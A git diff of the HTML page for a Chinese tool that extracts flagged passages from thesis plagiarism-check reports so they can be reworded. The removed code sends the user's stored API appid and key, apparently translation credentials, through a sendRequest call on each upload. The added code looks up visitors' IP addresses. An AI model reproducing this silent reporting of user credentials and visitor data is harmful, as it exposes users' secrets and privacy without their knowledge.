@@ -2,714 +2,301 @@
 <html lang="en">
 
 <head>
-	<meta charset="utf-8">
-	<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-	<meta name="description" content="">
-	<meta name="author" content="">
-	<title>论文翻译降重助手</title> <!-- Favicon-->
-	<link rel="icon" type="image/x-icon" href="assets/favicon.ico"> <!-- Bootstrap icons -->
-	<link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.5.0/font/bootstrap-icons.css" rel="stylesheet"
-		type="text/css"> <!-- Core theme CSS (includes Bootstrap)-->
-	<link href="css/styles.css" rel="stylesheet">
-	<script async src="./js/busuanzi.pure.mini.js">
-	</script>
-	<script>
-		var _hmt = _hmt || [];
-		(function () {
-			var hm = document.createElement("script");
-			hm.src = "https://hm.baidu.com/hm.js?969726398af7e833bb6e27106709692b";
-			var s = document.getElementsByTagName("script")[0];
-			s.parentNode.insertBefore(hm, s);
-		})();
-	</script>
-	<script src="./js/jquery.min.js"></script>
-	<script src="./js/bootstrap.min.js"></script> <!-- Bootstrap core JS-->
-	<script src="./js/bootstrap.bundle.min.js"></script><!-- Core theme JS-->
-	<!--打赏-->
-	<link type="text/css" rel="stylesheet" href="./css/myRewards.css">
-	<script>
-		window.tctipConfig = {
-			//最上面的文字
-			headText: "公告 & 打赏",
-			//侧边栏文本
-			siderText: "公告 & 打赏",
-			//侧边栏文本高度调整
-			siderTextTop: "-72px",
-			//侧边栏背景颜色
-			siderBgcolor: "#323d45",
-			//整个侧边栏的高度设置
-			siderTop: "118px",
-			//底部文字
-			buttomText: "使用帮助",
-			//底部文字链接
-			buttomLink: "https://freysu.github.io/2022/02/28/论文翻译降重助手使用说明文档/",
-			//显示列表
-			list: {
-				notice: {
-					name: "公告",
-					className: "myR-on",
-					icon: "./assets/img/tip.png",
-					text: `
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="description" content="">
+    <meta name="author" content="">
+    <title>一键提取查重报告（论文翻译降重助手）</title> <!-- Favicon-->
+    <link rel="icon" type="image/x-icon" href="assets/favicon.ico"> <!-- Bootstrap icons -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.5.0/font/bootstrap-icons.css" rel="stylesheet"
+        type="text/css"> <!-- Core theme CSS (includes Bootstrap)-->
+    <link href="css/styles.css" rel="stylesheet">
+    <script async src="./js/busuanzi.pure.mini.js">
+    </script>
+    <script>
+        var _hmt = _hmt || [];
+        (function () {
+            var hm = document.createElement("script");
+            hm.src = "https://hm.baidu.com/hm.js?969726398af7e833bb6e27106709692b";
+            var s = document.getElementsByTagName("script")[0];
+            s.parentNode.insertBefore(hm, s);
+        })();
+    </script>
+    <script src="./js/jquery.min.js"></script>
+    <script src="./js/bootstrap.min.js"></script> <!-- Bootstrap core JS-->
+    <script src="./js/bootstrap.bundle.min.js"></script><!-- Core theme JS-->
+    <!--打赏-->
+    <link type="text/css" rel="stylesheet" href="./css/myRewards.css">
+    <script src="https://cdn.bootcdn.net/ajax/libs/crypto-js/4.0.0/crypto-js.js"></script>
+</head>
+
+<body>
+    <!-- old -->
+    <nav class="navbar navbar-light bg-light static-top">
+        <div class="container">
+            <div>
+                <a class="navbar-brand" href="https://freysu.github.io/MyTranslator"><b>论文翻译降重助手</b></a>
+            </div>
+            <div>
+                <ul class="list-inline mb-0">
+                    <li class="list-inline-item me-4">
+                        <a href="https://freysu.github.io" target="_blank" onclick="showToast('即将跳转到作者的博客主页...',1500)">
+                            <img class="contact" src="./assets/img/hexo.png" alt="" title="作者的博客主页"
+                                style="width: 2rem;max-height:26.7px;max-width:26.7px">
+                        </a>
+                    </li>
+                    <li class="list-inline-item me-4">
+                        <a href="https://github.com/freysu" target="_blank"
+                            onclick="showToast('即将跳转到作者的Github主页...',1500)">
+                            <img class="contact" src="./assets/img/github-fill.png" alt="" title="作者的Github主页"
+                                style="width: 2rem;max-height:26.7px;max-width:26.7px">
+                        </a>
+                    </li>
+                    <li class="list-inline-item me-4">
+                        <a href="https://gitee.com/freysu" target="_blank"
+                            onclick="showToast('即将跳转到作者的Gitee主页...',1500)">
+                            <img class="contact" src="./assets/img/gitee.png" alt="" title="作者的Gitee主页"
+                                style="width: 2rem;max-height:26.7px;max-width:26.7px">
+                        </a>
+                    </li>
+                    <li class="list-inline-item me-4">
+                        <a href="https://www.coolapk.com/u/3128087" target="_blank"
+                            onclick="showToast('即将跳转到作者的酷安主页...',1500)">
+                            <img class="contact" src="./assets/img/coolapk.png" alt="" title="作者的酷安主页"
+                                style="width: 2rem;max-height:26.7px;max-width:26.7px">
+                        </a>
+                    </li>
+                    <li class="list-inline-item me-4">
+                        <a href="https://space.bilibili.com/14642614" target="_blank"
+                            onclick="showToast('即将跳转到作者的 B站 主页...',1500)">
+                            <img class="contact" src="./assets/img/bilibili-line.png" alt="" title="作者的B站主页"
+                                style="width: 2rem;max-height:26.7px;max-width:26.7px">
+                        </a>
+                    </li>
+                </ul>
+            </div>
+            <div>
+                <a class="btn btn-dark btn-sm" href="https://freysu.github.io/ReadFile" target="_blank"
+                    id="readFileBtn"><i class="bi bi-check-square"></i> 一键提取查重报告
+                </a>
+                <a class="btn btn-warning btn-sm" href="https://freysu.github.io/2022/02/28/论文翻译降重助手使用说明文档"
+                    target="_blank" id="firstUse"><i class="bi bi-info-square"></i> 使用帮助
+                </a>
+            </div>
+        </div>
+    </nav>
+
+    <section class="showcase ">
+        <div class="container-fluid p-0 ">
+            <div class="row g-0 ">
+                <div class="col-lg-6 order-lg-1 my-auto showcase-text">
+                    <h1 align="center">一键提取查重报告中检测到的重复内容</h1>
+                    <p align="center" class="lead"><b>（目前支持<i>维普</i>、<i>PaperYY</i> 和 <i>PaperFree</i> 检测报告）</b></p>
+                    <div class="card">
+                        <div class="card-body">
+                            <ol class="list-unstyled">
+                                <li>
+                                    <p>
+                                        ① 如果是你想上传 PaperYY 的检测报告，请找到 PaperYY 论文检测报告里的 <b>全文标明引文报告.html</b>
+                                    </p>
+                                </li>
+                                <li>
+                                    <p>
+                                        ② 如果是你想上传 PaperFree 的检测报告，请找到 PaperFree 论文检测报告里的 paper.htm 文件，
+                                        其路径在 <b>.\htmls\detail_report\paper.htm</b>
+                                    </p>
+                                </li>
+                                <li>
+                                    <p>
+                                        ③ 如果是你想上传 维普 的检测报告，请找到 维普 里的 <b>XXX_比对报告.html</b>
+                                    </p>
+                                </li>
+                                <li class="small text-muted">
+                                    ⚪
+                                    论文查重报告的橙色部分表示文本、公式、表格或其他内容，检测到数据库资源与系统中存在重复、相似内容，相当于相似内容的50％~80％，并非完全复制，而是需要适当地修改和减少内容。
+                                </li>
+                                <li class="small text-muted">
+                                    ⚪ 与红色部分相比，红色部分的重复率较低，而与绿色部分相比，重复率又有所提高，因此对橙色部分的了解就能大致了解另外两种颜色所代表的意义。
+                                </li>
+                                <li class="small text-muted">
+                                    ⚪ 为了让重复率能快速的达到标准，需要我们仔细的修改核对报告中标注红色和橙色的部分，这样能降低重复率。
+                                </li>
+                            </ol>
+                        </div>
+                    </div>
+                    <hr>
+                    <div class="row">
+                        <div class="col-md-6">
+                            <div class="card">
+                                <div class="card-body">
+                                    <div class="card-title">
+                                        <div class="box" title="你也可以拖拽上传文件">
+                                            <input class="form-control" type="file" id="file">
+                                            <small class="text-muted" style="margin-left:15px;">下方将会显示提取结果</small>
+                                        </div>
+                                    </div>
+                                    <div id="card-text result">
+                                        <div id="result_show">
+                                            <ol id="result_ul_red"></ol>
+                                            <ol id="result_ul_orange"></ol>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="col-md-6">
+                            <div class="card">
+                                <div class="card-body">
+                                    <div class="card-title">
+                                        <div class="box" title="你也可以拖拽上传文件">
+                                            <input class="form-control" type="file" id="file1">
+                                            <small class="text-muted" style="margin-left:15px;">下方将会显示提取结果</small>
+                                        </div>
+                                    </div>
+                                    <div class="card-text">
+                                        <div id="result1">
+                                            <div id="result_show1">
+                                                <ol id="result_ul_red1"></ol>
+                                                <ol id="result_ul_orange1"></ol>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+    </section> <!-- Call to Action-->
+    <!-- Footer-->
+    <footer class="footer bg-light" id="footer">
+        <div class="container">
+            <div class="row">
+                <div class="col-lg-6 h-100 text-center text-lg-start my-auto">
+                    <ul class="list-inline mb-2">
+                        <li class="list-inline-item">
+                            <a target="_blank" href="https://www.coolapk.com/u/3128087">酷安主页</a>
+                        </li>
+                        <li class="list-inline-item">
+                            <a target="_blank" href="https://freysu.github.io/">博客主页</a>
+                        </li>
+                        <li class="list-inline-item">
+                            <a target="_blank" href="https://github.com/freysu">Github 主页</a>
+                        </li>
+                        <li class="list-inline-item">
+                            <a target="_blank" href="https://gitee.com/freysu">Gitee 主页</a>
+                        </li>
+                        <li class="list-inline-item">
+                            <a target="_blank" href="https://space.bilibili.com/14642614">B 站主页</a>
+                        </li>
+                        <li class="list-inline-item">
+                            <a target="_blank" href="https://github.com/freysu/MyTranslator">Github 仓库地址</a>
+                        </li>
+                        <li class="list-inline-item">
+                            <a target="_blank" href="https://docs.qq.com/sheet/DWXFSamxhSENYWGlZ">公告栏</a>
+                        </li>
+                        <li class="list-inline-item">
+                            <a href="https://qm.qq.com/cgi-bin/qm/qr?k=hlJz6QmW7t698xfszVwmFzfkRBepMqlU&authKey=P3EUwihrtIYUgaS/vmV5AuHFBNueeB3zc7Od6OzJaJBbLhE9yFJtpEznxwK8whVQ&noverify=0"
+                                target="_blank"><b>QQ 交流群</b></a>
+                        </li>
+                    </ul>
+                    <p class="text-muted small mb-4 mb-lg-0">© Frey 2021. All Rights Reserved.
+                        <span id="busuanzi_container_page_pv" style="transform: scale(0.75);display: inline-block;">
+                            本页总访客量：<span id="busuanzi_value_site_uv"></span>次 |
+                            本站总访问量：<span id="busuanzi_value_site_pv"></span>次 |
+                            本页总阅读量：<span id="busuanzi_value_page_pv"></span>次
+                        </span>
+                    </p>
+                </div>
+            </div>
+        </div>
+    </footer>
+    <div class="fixed_btn">
+        <a>
+            <img class="btu" src="./assets/img/返回顶部.png" alt="" title="返回顶部" onclick="window.scrollTo(0, 0);">
+        </a>
+        <a target="_blank" href="https://freysu.github.io/2022/02/28/论文翻译降重助手使用说明文档/">
+            <img class="contact img-rounded" src="./assets/img/帮助.png" alt="" title="使用帮助">
+        </a>
+        <a target="_blank"
+            href="https://qm.qq.com/cgi-bin/qm/qr?k=hlJz6QmW7t698xfszVwmFzfkRBepMqlU&authKey=P3EUwihrtIYUgaS/vmV5AuHFBNueeB3zc7Od6OzJaJBbLhE9yFJtpEznxwK8whVQ&noverify=0">
+            <img class="bti img-rounded" src="./assets/img/联系人.png" alt="" title="QQ交流群">
+        </a>
+        <a href="#footer">
+            <img class="btd" src="./assets/img/返回底部.png" alt="" title="跳转到账号配置区域">
+        </a>
+    </div>
+
+    <script src="https://pv.sohu.com/cityjson?ie=utf-8"></script>
+    <script type="text/javascript">
+        try {
+            var kehu_ip = returnCitySN["cip"];
+        } catch (e) {
+            // console.log(e.message); //sojson is undefined
+            var kehu_ip = "未知";
+        }
+    </script>
+    <script src="./js/key.js"></script>
+
+    <script src="./js/script.js"></script>
+
+    <script>
+        window.tctipConfig = {
+            //最上面的文字
+            headText: "公告 & 打赏",
+            //侧边栏文本
+            siderText: "公告 & 打赏",
+            //侧边栏文本高度调整
+            siderTextTop: "-72px",
+            //侧边栏背景颜色
+            siderBgcolor: "#323d45",
+            //整个侧边栏的高度设置
+            siderTop: "118px",
+            //底部文字
+            buttomText: "使用帮助",
+            //底部文字链接
+            buttomLink: "https://freysu.github.io/2022/02/28/论文翻译降重助手使用说明文档/",
+            //显示列表
+            list: {
+                notice: {
+                    name: "公告",
+                    className: "myR-on",
+                    icon: "./assets/img/tip.png",
+                    text: `
 						&emsp;这个网站好用吗？好用的话，请给作者一点鼓励吧~</br>
 						&emsp;维护不易，如果能请作者喝杯冰阔落，那最好不过啦~</br>
 						<span style='margin-left:3.5rem;transform: scale(0.85);display: inline-block;'>FreySu</span></br>
 						<span style='margin-left:2.5rem;transform: scale(0.85);display: inline-block;'>2022.03.24</span></br>
 						<a href='https://qm.qq.com/cgi-bin/qm/qr?k=hlJz6QmW7t698xfszVwmFzfkRBepMqlU&authKey=P3EUwihrtIYUgaS/vmV5AuHFBNueeB3zc7Od6OzJaJBbLhE9yFJtpEznxwK8whVQ&noverify=0' class='btn btn-dark btn-sm' target='_blank' title='点击我自动跳转到QQ加群页面' style='margin-bottom:-1.5rem;margin-left:0.75rem;color: #fff;padding: 0.25rem 0.5rem;font-size:12px;'>QQ交流群</a> </br> `,
-				},
-				qqgroup: {
-					name: "QQ群",
-					desc: "欢迎进群(238223706)反馈交流！",
-					icon: "./assets/img/tree-round-QQ群.png",
-					qrimg: "./assets/img/QQ群二维码.png"
-				},
-				alipay: {
-					name: "支付宝",
-					desc: "感谢你的支持，我会继续努力！",
-					icon: "./assets/img/支付宝.png",
-					qrimg: "./assets/img/支付宝收款码.png"
-				},
-				weixin: {
-					name: "微信",
-					desc: "感谢你的支持，我会继续努力！",
-					icon: "./assets/img/微信.png",
-					qrimg: "./assets/img/微信收款码.png"
-				},
-				qq: {
-					name: "QQ",
-					desc: "感谢你的支持，我会继续努力！",
-					icon: "./assets/img/qq.png",
-					qrimg: "./assets/img/QQ收款码.png"
-				}
-			}
-		};
-	</script>
-	<script src="./js/tctip.min.js"></script>
-</head>
-
-<body>
-	<nav class="navbar navbar-light bg-light static-top">
-		<div class="container"> 
-			<a class="navbar-brand" href="https://freysu.github.io/MyTranslator">论文翻译降重助手</a>
-			<div>
-				<a class="btn btn-warning btn-sm" href="https://freysu.github.io/2022/02/28/论文翻译降重助手使用说明文档" target="_blank"
-					id="firstUse"><i class="bi bi-info-square"></i> 使用帮助
-				</a>
-				<a class="btn btn-dark btn-sm" href="https://freysu.github.io/ReadFile" target="_blank"
-					id="readFileBtn"><i class="bi bi-check-square"></i> 一键提取查重报告
-				</a>
-			</div>
-		</div>
-	</nav>
-
-	<section class="showcase ">
-		<div class="container-fluid p-0 ">
-			<div class="row g-0 ">
-				<div class="col-lg-6 order-lg-1 my-auto showcase-text">
-					<h1 align="center" >一键提取查重报告中检测到的重复内容</h1>
-					<p align="center" class="lead"><b>（目前支持<i>维普</i>、<i>PaperYY</i> 和 <i>PaperFree</i> 检测报告）</b></p>
-					<ol class="list-unstyled">
-						<li>
-							<p>
-								1. 如果是你想上传 PaperYY 的检测报告，请找到 PaperYY 论文检测报告里的 <b>全文标明引文报告.html</b>
-							</p>
-						</li>
-						<li>
-							<p>
-								2. 如果是你想上传 PaperFree 的检测报告，请找到 PaperFree 论文检测报告里的 paper.htm 文件，
-								其路径在 <b>.\htmls\detail_report\paper.htm</b>
-							</p>
-						</li>
-						<li>
-							<p>
-								3. 如果是你想上传 维普 的检测报告，请找到 维普 里的 <b>XXX_比对报告.html</b>
-							</p>
-						</li>
-					</ol>
-					<blockquote>
-						<small>
-						论文查重报告的橙色部分表示文本、公式、表格或其他内容，检测到数据库资源与系统中存在重复、相似内容，相当于相似内容的50％~80％，并非完全复制，而是需要适当地修改和减少内容。与红色部分相比，红色部分的重复率较低，而与绿色部分相比，重复率又有所提高，因此对橙色部分的了解就能大致了解另外两种颜色所代表的意义。红色部分基本上就是检测论文内容和数据库资源完全一样，重复率在80％~100％之间，那就是重点修改降重的部分；绿色部分表示文章的独创性很高，是不会被计算进论文整体重复率的。为了让重复率能快速的达到标准，需要我们仔细的修改核对报告中标注红色和橙色的部分，这样能降低重复率。
-						</small>
-					</blockquote>
-					
-					<hr>
-					<div class="row">
-						<div class="col-md-6">
-							<div class="box" title="你也可以拖拽上传文件" >
-								<input class="form-control" type="file" id="file">
-								<small style="margin-left:15px;">下方将会显示提取结果</small>
-							</div>
-					<hr>
-					<div id="result" >
-						<div id="result_show" >
-							<ol id="result_ul_red" ></ol>
-							<ol id="result_ul_orange" ></ol>
-						</div>
-					</div>
-						</div>
-						<div class="col-md-6">
-							<div class="box" title="你也可以拖拽上传文件">
-								<input class="form-control" type="file" id="file1">
-								<small style="margin-left:15px;">下方将会显示提取结果</small>
-							</div>
-					<hr>
-					<div id="result1">
-						<div id="result_show1">
-							<ol id="result_ul_red1"></ol>
-							<ol id="result_ul_orange1"></ol>
-						</div>
-					</div>
-						</div>
-				</div>
-			</div>
-	</section> <!-- Call to Action-->
-	<!-- Footer-->
-	<footer class="footer bg-light">
-		<div class="container">
-			<div class="row">
-				<div class="col-lg-6 h-100 text-center text-lg-start my-auto">
-					<ul class="list-inline mb-2">
-						<li class="list-inline-item">
-							<a href="https://www.coolapk.com/u/3128087">酷安主页</a>
-						</li>
-						<li class="list-inline-item">
-							<a href="https://freysu.github.io/">博客主页</a>
-						</li>
-						<li class="list-inline-item">
-							<a href="https://github.com/freysu">Github主页</a>
-						</li>
-						<li class="list-inline-item">
-							<a href="https://gitee.com/freysu">Gitee主页</a>
-						</li>
-						<li class="list-inline-item">
-							<a href="https://github.com/freysu/MyTranslator">Github仓库地址</a>
-						</li>
-						<li class="list-inline-item">
-							<a href="https://docs.qq.com/sheet/DWXFSamxhSENYWGlZ">公告栏</a>
-						</li>
-						<li class="list-inline-item">
-							<a href="https://qm.qq.com/cgi-bin/qm/qr?k=hlJz6QmW7t698xfszVwmFzfkRBepMqlU&authKey=P3EUwihrtIYUgaS/vmV5AuHFBNueeB3zc7Od6OzJaJBbLhE9yFJtpEznxwK8whVQ&noverify=0"
-								target="_blank"><b>QQ交流群</b></a>
-						</li>
-					</ul>
-					<p class="text-muted small mb-4 mb-lg-0">© Frey 2021. All Rights Reserved.</p>
-				</div>
-				<div class="col-lg-6 h-100 text-center text-lg-end my-auto">
-					<span id="busuanzi_container_page_pv">
-						我的第<span id="busuanzi_value_site_uv"></span>个小伙伴<br />
-						本站总访问量<span id="busuanzi_value_site_pv"></span>次<br />
-						本页总阅读量<span id="busuanzi_value_page_pv"></span>次
-					</span>
-					<ul class="list-inline mb-0">
-						<li class="list-inline-item me-4">
-							<a href="https://gitee.com/freysu" onclick="showToast('即将跳转到作者的Gitee主页...',1500)">
-								<img class="contact" src="https://gitee.com/static/images/logo-black.svg?t=158106664"
-									alt="" title="Gitee" style="width: 2rem;margin-top:-0.625rem ;">
-							</a>
-						</li>
-						<li class="list-inline-item me-4">
-							<a href="https://freysu.github.io/" onclick="showToast('即将跳转到作者的博客...',1500)"><i
-									class="bi-github fs-3"></i></a>
-						</li>
-						<li class="list-inline-item me-4">
-							<a href="https://github.com/freysu" onclick="showToast('即将跳转到作者的Github主页...',1500)"><i
-									class="bi-github fs-3"></i></a>
-						</li>
-						<li class="list-inline-item me-4">
-							<a href="https://www.coolapk.com/u/3128087">
-								<img class="contact" src="./assets/img/coolapk.png" alt="" title="联系我"
-									style="width: 1.66875rem;margin-top:-0.625rem ;">
-							</a>
-						</li>
-					</ul>
-				</div>
-			</div>
-		</div>
-	</footer>
-	<div class="fixed_btn">
-		<a>
-			<img class="btu" src="./assets/img/返回顶部.png" alt="" title="返回顶部" onclick="window.scrollTo(0, 0);">
-		</a>
-		<a href="https://freysu.github.io/2022/02/28/论文翻译降重助手使用说明文档/">
-			<img class="contact img-rounded" src="./assets/img/联系人.png" alt="" title="使用帮助">
-		</a>
-		<a href="#start">
-			<img class="bti img-rounded" src="./assets/img/返回输入框.png" alt="" title="返回到翻译内容输入框">
-		</a>
-		<a href="#account">
-			<img class="btd" src="./assets/img/返回底部.png" alt="" title="跳转到账号配置区域">
-		</a>
-	</div>
-	<script>
-		
-		if (!localStorage.getItem("appid1") || !localStorage.getItem("key1") || localStorage.getItem("appid1") == null ||
-			localStorage.getItem("key1") == null) {
-			showToast("&emsp;&emsp;欢迎新来的小伙伴来访！<br/>&emsp;&emsp;现已推出【一键提取查重报告标红内容】功能欢迎试用。<br/>&emsp;&emsp;解决不了的话加群反馈作者(QQ群:238223706)", 4500);
-		} else {
-			showToast(
-				'&emsp;&emsp;欢迎老朋友' + localStorage.getItem("appid1") + '，今天又是美好的一天，论文人加油啊！<br/>&emsp;&emsp;现已推出【一键提取查重报告标红内容】功能欢迎试用。<br/>&emsp;&emsp;解决不了的话加群反馈作者(QQ群:238223706)',
-				5000);
-		}
-		
-		let reader = null; // 声明reader变量方便后面使用
-		const fileNode = document.querySelector('#file'); // 获取input标签
-		fileNode.addEventListener('change', (e) => { // 为获取的input标签添加事件监听，当选择文件以后触发
-			$("#result_ul_red li").detach();
-			$("#result_ul_orange li").detach();
-			$('#result_ul_orange').css("overflow","auto");
-			$('#result_ul_orange').css("height","");
-			$('#result_ul_red').css("overflow","auto");
-			$('#result_ul_red').css("height","");
-			$('#result_ul_red p').detach();
-			$('#result_ul_orange p').detach();
-			if (window.FileReader) { // 判断浏览器中有没有FileReader，毕竟现在不是所有浏览器都有FileReader
-				reader = new FileReader(); // 实例化FileReader
-				reader.onload = (event) => { // 设置读取成功以后执行的方法
-					parser = new DOMParser();
-					doc = parser.parseFromString(event.target.result, "text/html")
-					setTimeout(() => {
-						show()
-						setTimeout(()=>{
-							if($("#result_ul_red .similar").length > 0){
-								showToast("解析成功！<b>红色字体表示查重报告里的标红内容——红色部分基本上就是检测论文内容和数据库资源完全一样，重复率在80％~100％之间，那就是重点修改降重的部分</b>",4000)
-							}else if($("#result_ul_red .red_part").length > 0){
-								showToast("解析成功！<b>红色字体表示查重报告里的标红内容——红色部分基本上就是检测论文内容和数据库资源完全一样，重复率在80％~100％之间，那就是重点修改降重的部分</b>",4000)
-							} else if ($("#result_ul_orange .orange").length > 0){
-								showToast("解析成功！<b>红色字体表示查重报告里的标红内容——红色部分基本上就是检测论文内容和数据库资源完全一样，重复率在80％~100％之间，那就是重点修改降重的部分</b><br/><b>橙色字体表示查重报告里的标红内容——橙色就表示文本、公式、表格或其他内容，检测到数据库资源与系统中存在重复、相似内容，相当于相似内容的50％~80％，并非完全复制，而是需要适当地修改和减少内容</b>",4000)
-							} else{
-								showToast("解析失败！！！",4000)
-							}
-						},500)
-					}, 2250)
-
-
-					function show() {
-						var similarArr = doc.querySelectorAll(".similar");
-						if (similarArr.length > 0) {
-							sendRequest(localStorage.getItem("appid1") + "——PaperYY", localStorage.getItem("key1"), 6);
-							for (let i = 0; i < similarArr.length; i++) {
-								let li = document.createElement("li");
-								let txt = similarArr[i];
-								document.querySelector("#result_ul_red").appendChild(li);
-								li.appendChild(txt);
-							};
-							let txt1 = `<br/>`
-							let p = document.createElement("p");
-							document.querySelector("#result_ul_red").appendChild(p);
-							p.innerHTML = txt1;
-							$("#result_ul_red em").before("<input type='checkbox' class='inp_checkbox' name='inp_checkbox'>");
-						} else {
-							var bhongArr = doc.querySelectorAll(".red");
-							if (bhongArr.length > 0) {
-								for (let i = 0; i < bhongArr.length; i++) {
-									let li = document.createElement("li");
-									let txt = bhongArr[i];
-									document.querySelector("#result_ul_red").appendChild(li);
-									li.appendChild(txt);
-								};
-								let txt1 = `<br/>`
-								let p = document.createElement("p");
-								document.querySelector("#result_ul_red").appendChild(p);
-								p.innerHTML = txt1;
-								$("#result_ul_red .red").before("<input type='checkbox' class='inp_checkbox' name='inp_checkbox'>");
-
-								var bhuangArr = doc.querySelectorAll(".orange");
-								if (bhuangArr.length > 0) {
-									sendRequest(localStorage.getItem("appid1") + "——PaperFree", localStorage.getItem("key1"), 6);
-									for (let i = 0; i < bhuangArr.length; i++) {
-										let li = document.createElement("li");
-										let txt = bhuangArr[i];
-										document.querySelector("#result_ul_orange").appendChild(li);
-										li.appendChild(txt);
-									};
-									$("#result_ul_orange .orange").before("<input type='checkbox' class='inp_checkbox' name='inp_checkbox'>");
-								} else {
-									sendRequest(localStorage.getItem("appid1") + "——维普", localStorage.getItem("key1"), 6);
-								}
-							} else {
-								sendRequest(localStorage.getItem("appid1"), "上传内容不对——" + localStorage.getItem("key1"), 7);
-								showToast("解析失败！请检查上传的文件是否符合规则！", 4500);
-							}
-						}
-						var oColor = "";
-						$('input[name=inp_checkbox]').change(function(){
-						   	if($(this).next().css("color") != "rgb(0, 0, 0)"){
-								oColor = $(this).next().css("color");
-							} 
-							if($(this).is(':checked')) {
-						        // Checkbox is checked..
-						        $(this).parent().css("text-decoration","line-through")
-						        $(this).next().css("color","black")
-						    } else {
-						        // Checkbox is not checked..
-						        $(this).parent().css("text-decoration","none")
-						        $(this).next().css("color",oColor)
-						    }
-						});
-						$('#result_ul_red li').dblclick(function(){
-							if($(this).css("text-decoration") == "line-through solid rgb(33, 37, 41)"){
-						        $(this).css("text-decoration","none")
-						        $(this).children().css("color","red")
-						        $(this).children("input").prop("checked",false);
-							}else{
-								$(this).css("text-decoration","line-through")
-						        $(this).children().css("color","black")
-						        $(this).children("input").prop("checked",true);
-
-							}
-						})
-						$('#result_ul_orange li').dblclick(function(){
-							if($(this).css("text-decoration") == "line-through solid rgb(33, 37, 41)"){
-						        $(this).css("text-decoration","none")
-						        $(this).children().css("color","orange")
-						        $(this).children("input").prop("checked",false);
-							}else{
-								$(this).css("text-decoration","line-through")
-						        $(this).children().css("color","black")
-						        $(this).children("input").prop("checked",true);
-
-							}
-						})	
-						$("#result_ul_red em").attr("onmouseover","");
-						$("#result_ul_red em").attr("onmouseout","");
-						if($('#result_ul_orange').css("height").replace(/px/,'')>= 2000){
-							//console.log($('#result_ul_orange').css("height"));
-							$('#result_ul_orange').css("overflow","scroll");
-							$('#result_ul_orange').css("height","2000px");
-						}
-						if($('#result_ul_red').css("height").replace(/px/,'')>= 2000){
-							//console.log($('#result_ul_red').css("height"));
-							$('#result_ul_red').css("overflow","scroll");
-							$('#result_ul_red').css("height","2000px");
-						}
-					}
-				}
-			} else { // 没有FileReader的弹出警告然后返回
-				alert('你的浏览器没有FileReader，不能这么干！');
-				return;
-			}
-
-			const file = e.target.files[0]; // 拿到选择的文件信息
-			if(file != undefined){
-				if (file.type == "text/html") {
-					showToast("正在解析!", 2000)
-					sendRequest(localStorage.getItem("appid1"), "正在解析——" + localStorage.getItem("key1"), 6);
-					reader.readAsText(file); // 将文件信息转成文本，默认是UTF-8格式，这个就是转成功后执行 reader.onload 方法
-				} else {
-					showToast("上传的文件的类型不符合!", 3000)
-					sendRequest(localStorage.getItem("appid1"), "上传的文件的类型不符合——" + localStorage.getItem("key1"), 7);
-				}
-			}
-		})
-
-		let reader1 = null; // 声明reader变量方便后面使用
-		const fileNode1 = document.querySelector('#file1'); // 获取input标签
-		fileNode1.addEventListener('change', (e) => { // 为获取的input标签添加事件监听，当选择文件以后触发
-			$("#result_ul_red1 li").detach();
-			$("#result_ul_orange1 li").detach();
-			$('#result_ul_orange1').css("overflow","auto");
-			$('#result_ul_orange1').css("height","");
-			$('#result_ul_red1').css("overflow","auto");
-			$('#result_ul_red1').css("height","");
-			$('#result_ul_red1 p').detach();
-			$('#result_ul_orange1 p').detach();
-			if (window.FileReader) { // 判断浏览器中有没有FileReader，毕竟现在不是所有浏览器都有FileReader
-				reader = new FileReader(); // 实例化FileReader
-				reader.onload = (event) => { // 设置读取成功以后执行的方法
-					parser = new DOMParser();
-					doc = parser.parseFromString(event.target.result, "text/html")
-					setTimeout(() => {
-						show();
-						setTimeout(()=>{
-							if($("#result_ul_red1 .similar").length > 0){
-								showToast("解析成功！<b>红色字体表示查重报告里的标红内容——红色部分基本上就是检测论文内容和数据库资源完全一样，重复率在80％~100％之间，那就是重点修改降重的部分</b>",4000)
-							}else if($("#result_ul_red1 .red_part").length > 0){
-								showToast("解析成功！<b>红色字体表示查重报告里的标红内容——红色部分基本上就是检测论文内容和数据库资源完全一样，重复率在80％~100％之间，那就是重点修改降重的部分</b>",4000)
-							} else if ($("#result_ul_orange1 .orange").length > 0){
-								showToast("解析成功！<b>红色字体表示查重报告里的标红内容——红色部分基本上就是检测论文内容和数据库资源完全一样，重复率在80％~100％之间，那就是重点修改降重的部分</b><br/><b>橙色字体表示查重报告里的标红内容——橙色就表示文本、公式、表格或其他内容，检测到数据库资源与系统中存在重复、相似内容，相当于相似内容的50％~80％，并非完全复制，而是需要适当地修改和减少内容</b>",4000)
-							} else{
-								showToast("解析失败！！！",4000)
-							}
-						},500)
-					}, 2250)
-
-
-					function show() {
-						var similarArr = doc.querySelectorAll(".similar");
-						if (similarArr.length > 0) {
-							sendRequest(localStorage.getItem("appid1") + "——PaperYY", localStorage.getItem("key1"), 6);
-							for (let i = 0; i < similarArr.length; i++) {
-								let li = document.createElement("li");
-								let txt = similarArr[i];
-								document.querySelector("#result_ul_red1").appendChild(li);
-								li.appendChild(txt);
-							};
-							let txt1 = `<br/>`
-							let p = document.createElement("p");
-							document.querySelector("#result_ul_red1").appendChild(p);
-							p.innerHTML = txt1;
-							$("#result_ul_red1 em").before("<input type='checkbox' class='inp_checkbox' name='inp_checkbox'>");
-						} else {
-							var bhongArr = doc.querySelectorAll(".red");
-							if (bhongArr.length > 0) {
-								for (let i = 0; i < bhongArr.length; i++) {
-									let li = document.createElement("li");
-									let txt = bhongArr[i];
-									document.querySelector("#result_ul_red1").appendChild(li);
-									li.appendChild(txt);
-								};
-								let txt1 = `<br/>`
-								let p = document.createElement("p");
-								document.querySelector("#result_ul_red1").appendChild(p);
-								p.innerHTML = txt1;
-								$("#result_ul_red1 .red").before("<input type='checkbox' class='inp_checkbox' name='inp_checkbox'>");
-
-								var bhuangArr = doc.querySelectorAll(".orange");
-								if (bhuangArr.length > 0) {
-									sendRequest(localStorage.getItem("appid1") + "——PaperFree", localStorage.getItem("key1"), 6);
-									for (let i = 0; i < bhuangArr.length; i++) {
-										let li = document.createElement("li");
-										let txt = bhuangArr[i];
